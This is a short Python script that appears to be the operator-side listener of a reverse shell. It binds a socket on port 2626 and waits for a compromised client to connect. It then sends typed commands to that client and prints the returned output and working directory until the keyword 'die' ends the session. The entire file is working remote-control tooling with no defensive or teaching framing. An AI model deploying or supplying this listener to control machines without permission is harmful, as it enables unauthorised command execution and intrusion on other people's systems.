import socket

#Listener host
server_host = "0.0.0.0"

#Listener port
server_port = 2626

# recv buffer size (128 KiB)
recv_buffer = 1024 * 128

# command seperator
seperator = "<sep>"

# make listening server socket and report
server_soc = socket.socket()
server_soc.bind((server_host, server_port))
server_soc.listen(5)
print(f"Listener bound on {server_host}:{server_port}...")

# accept connection and report
client_soc, client_address = server_soc.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")


# Get current directory of client
cwd = client_soc.recv(recv_buffer).decode()
print("[+] Current directory: ", cwd)


# Main Loop
while True:
    
    # Get command
    command = input(f"{cwd} $> ")
    
    # Continue on empty command
    if not command.strip():
        continue
   
    # Send command
    client_soc.send(command.encode())


    # Retreive command respons
    output = client_soc.recv(recv_buffer).decode()
    # Break out on keyword
    if command.lower() == "die":
        print("*dies*")
        break
    
    # split result and current directory
    results, cwd = output.split(seperator)
    
    # print results
    print(results)

#close connection
client_soc.close()
server_soc.close()


